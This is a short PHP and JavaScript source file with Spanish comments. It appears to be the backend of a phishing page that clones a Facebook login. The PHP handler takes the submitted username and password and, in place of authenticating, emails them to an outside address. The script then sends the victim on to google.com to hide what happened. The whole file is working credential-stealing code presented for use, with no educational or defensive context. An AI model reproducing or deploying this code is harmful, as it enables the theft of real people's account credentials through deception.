<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibes los datos en JSON
    $data = json_decode(file_get_contents('php://input'), true);

    $username = $data['username'];
    $password = $data['password'];

    // Aquí, en lugar de procesar la autenticación, enviarás un correo
    $to = 'gmail@chupatoto158.com';
    $subject = 'Nueva solicitud de inicio de sesión';
    $body = 'Nombre de Usuario: ' . $username . '\nContraseña: ' . $password;
    $headers = 'From: noreply@clonfacebook.com' . "\r\n" .
        'Reply-To: noreply@clonfacebook.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();

    if (mail($to, $subject, $body, $headers)) {
        echo json_encode(array('message' => 'Correo electrónico enviado correctamente.'));
    } else {
        echo json_encode(array('message' => 'Falló al enviar correo electrónico.'));
    }
}
?><script>
    function sendForm() {
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;

        var data = {
            'username': username,
            'password': password
        };

        fetch('/processLogin.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        }).then((response) => response.json())
            .then((data) => {
                if (data.message === 'Correo electrónico enviado correctamente.') {
                    // Redirecciona a Google.com
                    window.location.href = 'https://www.google.com';
                } else {
                    console.log(data.message);
                    // Aquí podrías mostrar algún mensaje de resultado
                }
            })
            .catch((error) => {
                console.error('Error:', error);
                // Aquí podrías manejar algún error
            });
    }
</script>
